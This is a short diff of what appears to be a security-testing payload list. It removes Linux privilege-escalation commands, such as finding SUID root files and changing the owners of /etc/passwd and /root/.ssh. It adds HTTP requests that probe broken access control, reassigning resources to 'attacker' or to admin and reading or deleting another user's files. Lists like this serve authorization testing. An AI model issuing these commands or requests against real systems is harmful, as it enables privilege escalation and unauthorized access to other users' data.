@@ -1,6 +1,12 @@
-find / -uid 0 -perm -4000 2>/dev/null
-find / -gid 0 -perm -2000 2>/dev/null
-chown www-data:www-data /etc/passwd
-chown -R nobody /root/.ssh
-find / -nouser 2>/dev/null
-find / -nogroup 2>/dev/null
+GET /api/file/1/owner
+PATCH /api/file/1 {"owner_id":1}
+PUT /api/resource/1 {"owner":"admin"}
+POST /api/share {"resource_id":1,"new_owner":1}
+DELETE /api/user/1/files
+GET /api/admin/files
+GET /api/user/0/resources
+PATCH /api/document/1 {"owned_by":"attacker"}
+PUT /api/project/1 {"owner_id":0}
+POST /api/transfer {"file_id":99,"new_owner":"attacker"}
+GET /api/user/2/documents (as user 1)
+DELETE /api/user/2/avatar (as user 1)
